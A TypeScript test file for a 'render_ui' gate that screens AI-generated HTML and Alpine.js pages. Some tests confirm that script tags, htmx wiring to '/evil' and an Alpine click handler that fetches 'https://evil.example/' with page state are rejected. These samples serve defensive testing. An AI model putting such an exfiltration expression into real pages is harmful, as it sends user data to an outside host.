import { describe, expect, test } from "bun:test"
import { Effect } from "effect"
import { canvasToolkit, HTML_MAX_BYTES, makeCanvasHandlers } from "./toolkit.js"
import type { CanvasEntry } from "./toolkit.js"

const call = (params: {
  id: string
  title: string
  html: string
  mode?: "replace" | "append"
  active?: boolean
}) =>
  Effect.gen(function* () {
    const rendered: Array<CanvasEntry> = []
    const layer = makeCanvasHandlers((entry) =>
      Effect.sync(() => {
        rendered.push(entry)
      }),
    )
    const kit = yield* canvasToolkit.pipe(Effect.provide(layer))
    // failureMode:"return" — a gate rejection comes back as a RESULT with
    // isFailure:true (data the model reads), never an error channel entry.
    const outcome = yield* kit.handle("render_ui", params)
    return { outcome, rendered }
  })

describe("render_ui — the deterministic UI gate at the chokepoint", () => {
  test("a clean page renders and reaches the sink with defaults filled", async () => {
    const { outcome, rendered } = await Effect.runPromise(
      call({
        id: "recipe",
        title: "Lasagna",
        html: `<section><h1>Lasagna</h1><p>Layers.</p></section>`,
      }),
    )
    expect(outcome.isFailure).toBe(false)
    expect(outcome.result).toEqual({ rendered: true, id: "recipe" })
    expect(rendered).toHaveLength(1)
    expect(rendered[0]).toMatchObject({ id: "recipe", mode: "replace", active: true })
  })

  test("a gate violation REJECTS the call with the findings — nothing reaches the sink", async () => {
    const { outcome, rendered } = await Effect.runPromise(
      call({
        id: "bad",
        title: "Bad",
        html: `<script>x</script><img src="/x.png" /><button hx-post="/evil">Go</button>`,
      }),
    )
    expect(outcome.isFailure).toBe(true)
    const message = JSON.stringify(outcome.result)
    expect(message).toContain("UiRejected")
    expect(message).toContain("dangerous-vocabulary")
    expect(message).toContain("a11y-min")
    expect(message).toContain("hx-wiring")
    expect(rendered).toHaveLength(0)
  })

  test("an oversized page bounces with the append guidance", async () => {
    const { outcome } = await Effect.runPromise(
      call({ id: "big", title: "Big", html: `<p>${"a".repeat(HTML_MAX_BYTES + 1)}</p>` }),
    )
    expect(outcome.isFailure).toBe(true)
    expect(JSON.stringify(outcome.result)).toContain("HtmlTooLarge")
  })
})

describe("render_ui — Alpine at the chokepoint", () => {
  test("a pomodoro page with Alpine directives passes and reaches the sink", async () => {
    const { outcome, rendered } = await Effect.runPromise(
      call({
        id: "pomodoro",
        title: "Pomodoro",
        html: `<div class="cv-page" x-data="{left:1500,on:false}" x-init="setInterval(() => { if (on && left > 0) left-- }, 1000)"><div class="cv-stat"><span class="cv-stat-value" x-text="Math.floor(left/60)+':'+String(left%60).padStart(2,'0')">25:00</span><span class="cv-stat-label">remaining</span></div><button class="cv-btn" @click="on=!on">start / pause</button></div>`,
      }),
    )
    expect(outcome.isFailure).toBe(false)
    expect(rendered).toHaveLength(1)
  })

  test("a foreign-API expression bounces with the alpine-expr finding", async () => {
    const { outcome, rendered } = await Effect.runPromise(
      call({
        id: "exfil",
        title: "Exfil",
        html: `<button @click="fetch('https://evil.example/?d='+state)">send</button>`,
      }),
    )
    expect(outcome.isFailure).toBe(true)
    expect(JSON.stringify(outcome.result)).toContain("alpine-expr")
    expect(rendered).toHaveLength(0)
  })
})
